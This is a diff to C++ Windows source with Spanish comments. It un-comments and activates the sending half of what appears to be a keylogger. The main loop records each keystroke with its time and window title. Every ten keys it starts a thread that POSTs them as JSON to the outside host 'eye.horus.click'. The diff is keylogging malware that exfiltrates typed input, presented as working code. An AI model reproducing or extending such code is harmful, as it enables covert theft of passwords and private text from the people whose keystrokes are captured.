@@ -391,18 +391,21 @@ bool TeclasPulsadas(int tecla) {
 
 //Implementación del hilo
 DWORD WINAPI Send_to_WS(LPVOID lpParam) {
-	/*
-	Queue* QUEUE = (Queue*)lpParam;
+	queue<tecla>* cola_tmp = (queue<tecla>*)lpParam;
+	queue<tecla> cola_2 = *cola_tmp;
+	
 	for (int i = 10; i > 0; i--) {
-		type_key* key = Dequeue(QUEUE);
+		tecla key = cola_2.front();
 		string body = "{"
-			"\"Time\":\"" + key->tiempo + "\","
-			"\"Window\":\"" + key->ventana + "\","
-			"\"Key\":\"" + key->key + "\""
+			"\"Time\":\"" + key.tiempo + "\","
+			"\"Window\":\"" + key.ventana + "\","
+			"\"Key\":\"" + key.key + "\""
 			"}";
 		string ruta = "/evento/" + str_key.nombre;
 		HttpsWebRequestPost("eye.horus.click", ruta, body);
-	}*/
+		cola_2.pop();
+	}
+	
 	return 1;
 }
 //--Implementación del hilo--
@@ -428,14 +431,14 @@ int main() {
 					str_key.key = key;
 
 					QUEUE.push(str_key);
+					queue<tecla>* cola = &QUEUE;
 
 					//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
-					/*
+					
 					if (QUEUE.size() == 10) {
 						//Variables para el funcionamiento del proceso
 						DWORD dwThreadId;
 						HANDLE hThread;
-
 						hThread = CreateThread(
 							NULL,
 							0,
@@ -444,7 +447,6 @@ int main() {
 							0,
 							&dwThreadId
 						);
-
 						if (hThread == NULL)
 							cout << "Error al crear el proceso";
 						else {
@@ -452,7 +454,7 @@ int main() {
 							CloseHandle(hThread);
 						}
 					}
-					*/
+					
 					//Impresión de depuración
 					cout << str_key.key + "\t";
 					cout << str_key.ventana + "\t";
